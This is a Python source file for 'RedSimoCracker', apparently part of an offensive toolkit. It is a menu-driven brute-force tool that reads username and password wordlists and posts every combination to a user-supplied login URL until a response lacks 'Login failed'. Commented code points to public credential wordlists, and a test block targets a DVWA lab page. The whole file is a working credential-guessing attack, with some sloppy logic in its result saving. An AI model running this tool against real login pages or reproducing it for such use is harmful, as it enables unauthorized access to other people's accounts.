import socket
import os
import sys
import re
import time
from rich.progress import Progress
from rich.table import Table
from datetime import datetime
import hashlib
import requests
from urllib.request import urlopen


#### RedSimoCracker Class
class RedSimoCrackerClass:
    def __init__(self, console_ui):
        self.console_ui = console_ui
        self.url = None  # Initialize the URL as None
        self.previous_results = []  # Initialize the previous results list
        self.usernames = 'ExploitationSection/DB/usernames.txt'
        self.passwords = 'ExploitationSection/DB/passwords.txt'
        self.username_key = None
        self.password_key = None
        self.submit_key = None

        #self.proxy = {
                #"http": "127.0.0.1:8080"  # Proxy settings if needed
            #}
            #self.pass_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
            #self.usernames_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt"
    
    # Password hashing method (not used in this implementation)
    def p_hash(self, password):
        return hashlib.sha1(password.encode()).hexdigest()
    
    def menu(self):
        while True:

            self.console_ui.print("[0] [bold]Start the Cracker")
            self.console_ui.print("[1] [bold]Show Previous Cracks")
            self.console_ui.print("[2] [bold]Back to the Main Menu")
            
            user_input = self.console_ui.styled_input(" >>> ", style="input")
            
            if user_input.strip() == "":
                self.console_ui.print("Invalid choice. Please select a valid option.", style="error")
                continue
            
            try:
                user_input = int(user_input)
                if user_input == 0:
                    self.get_valid_target()
                    self.get_dynamic_keys()
                    self.RedSimoCracker()
                elif user_input == 1:
                    self.display_previous_results()
                elif user_input == 2:
                    return
                else:
                    self.console_ui.print("Invalid choice. Please select a valid option.", style="error")
            except ValueError:
                self.console_ui.print("Invalid choice. Please select a valid option.", style="error")

    # Function to validate URLs
    def is_valid_url(self, url):
        # Advanced regex to validate URLs and domain names...
        regex = re.compile(
            r'^(?:http|ftp)s?://'  # http:// or https://
            r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+'  # Domain...
            r'(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)'  # Domain extension
            r'|'  # OR
            r'localhost'  # localhost
            r'|'  # OR
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'  # IPv4
            r'|'  # OR
            r'\[?[A-F0-9]*:[A-F0-9:]+\]?'  # IPv6
            r'|'  # OR
            r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+'  # Domain name without protocol
            r'(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)'  # Domain extension
            r'(?:/?|[/?]\S+)?$', re.IGNORECASE)
        return re.match(regex, url) is not None

    # Function to get a valid target
    def get_valid_target(self):
        while True:
            target = self.console_ui.styled_input("Enter the Login Page URL >>> ", style="input")
            if self.is_valid_url(target):
                self.url = target  # Store the valid URL
                return target
            else:
                self.console_ui.print("Invalid URL. Please enter a valid URL.", style="error")
    
    # Function to get dynamic keys for the credentials
    def get_dynamic_keys(self):
        self.username_key = self.console_ui.styled_input("Enter the parameter for username >>> ", style="input")
        self.password_key = self.console_ui.styled_input("Enter the parameter for password >>> ", style="input")
        self.submit_key = self.console_ui.styled_input("Enter the third parameter if any >>> ", style="input")
    
    # Read usernames and passwords from URLs or Local files
    def read_wordlist(self):
        #usernames = urlopen(self.usernames_url).read().decode("UTF-8").split('\n')
        #passwords = urlopen(self.pass_url).read().decode("UTF-8").split('\n')
        #return usernames, passwords
        # Debug prints to check current directory and file paths
        self.console_ui.print(f"Current working directory: {os.getcwd()}", style="bold blue")
        self.console_ui.print(f"Expected path for usernames: {os.path.abspath(self.usernames)}", style="bold blue")
        self.console_ui.print(f"Expected path for passwords: {os.path.abspath(self.passwords)}", style="bold blue")

        if not os.path.exists(self.usernames):
            self.console_ui.print(f"Usernames file not found: {self.usernames}", style="error")
            sys.exit(1)
        if not os.path.exists(self.passwords):
            self.console_ui.print(f"Passwords file not found: {self.passwords}", style="error")
            sys.exit(1)

        with open(self.usernames, 'r', encoding='utf-8') as file:
            usernames = file.read().splitlines()
        with open(self.passwords, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
        return usernames, passwords
    
    def send_request(self, username, password):
        credentials = {
            self.username_key: username,
            self.password_key: password,
            self.submit_key: "Login"
        }
        
        try:
            req = requests.post(self.url, data=credentials, timeout=10)
            self.console_ui.print(f"Requesting {self.url} with {self.username_key}='{username}' and {self.password_key}='{password}'", style="magenta")

            # Check the status code
            if req.status_code == 200:
                #if req.text.find("Login failed") == -1:
                if "Login failed" not in req.text:
                    self.console_ui.print(f"\nLogin successful with {self.username_key}= {username} and {self.password_key}= {password}\n", style="success")
                    self.add_previous_result({"Target": self.url, self.username_key: username, self.password_key: password})
                    sys.exit(0)
                else:
                    self.console_ui.print(f"Failed Login with {self.username_key}= {username} and {self.password_key}= {password}", style="error")    
            else:
                self.console_ui.print(f"Received response code {req.status_code} for {username}", style="error")
                self.console_ui.print(f"Received response code {req.status_code}: {req.text}", style="error")
        
        except requests.exceptions.RequestException as e:
            self.console_ui.print(f"Request failed: {e}", style="error")
      
    def RedSimoCracker(self):
            
        # Banner
            self.console_ui.print("_" * 30, style="magenta")
            self.console_ui.print(f"[bold]Crack The Page: [green][{self.url}]")
            self.console_ui.print("Cracking started at: " + str(datetime.now().date()) + " | " + datetime.now().strftime("%I:%M %p"))
            self.console_ui.print("_" * 30, style="magenta")


            usernames, passwords = self.read_wordlist()

            total_combinations = len(usernames) * len(passwords)
            self.console_ui.print(f"[bold]Total Usernames and Passwords for the Bruteforce Process ==> [green]({total_combinations})\n")
            self.console_ui.print(f"[bold]This Script supports only login.php, but in the future we will add another technologies..[green]")
            self.console_ui.print("\nTesting started...\n", style="green")

            for username in usernames:
                for pwd in passwords:
                    self.console_ui.print(f"[bold]Testing: {self.username_key}='{username}', {self.password_key}='{pwd}'", style="magenta")
                    self.send_request(username, pwd)
                
            self.console_ui.print("\n[bold]Bad News!. All combinations tested. No valid credentials found.", style="error")

            # Save attempts to file:
            with open("credentials.txt", "w") as file:
                with Progress(console=self.console_ui.console, transient=True) as progress:
                    task = progress.add_task("[bold magenta]Saving Credentials...", total=10)
                    for _ in range(10):
                        file.write(f"{self.username_key}= {username} | {self.password_key}= {pwd} for a website => {self.url}\n")
                        progress.update(task, advance=1)
                        time.sleep(0.8)  # Slower processing time
            self.console_ui.print("   :thumbs_up: Whois result have been saved ==> <credentials.txt>", style="success")

    def add_previous_result(self, result):
        self.previous_results.append(result)

    def display_previous_results(self):
        try:
            if self.previous_results:
                table = Table(title="Previous Bruteforce Usernames && Pass", show_header=True, header_style="bold magenta")
                table.add_column("Target")
                table.add_column(self.username_key)
                table.add_column(self.password_key)

                for result in self.previous_results:
                    table.add_row(
                        str(result.get("Target", "")),
                        str(result.get(self.username_key, "")),
                        str(result.get(self.password_key, "")),
                    )

                self.console_ui.print(table)
            else:
                self.console_ui.print("No previous results available.", style="error")
        except Exception as e:
            self.console_ui.print(f"An error occurred while displaying results: {e}", style="error")

            
    ##### Test Connectivity #######
"""

    url = "http://192.168.1.3/dvwa/login.php"
    try:
        response = requests.get(url, timeout=10)
        print(f"Status Code: {response.status_code}")
        print(f"Response Text: {response.text[:100]}")  # Print the first 100 characters
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

"""

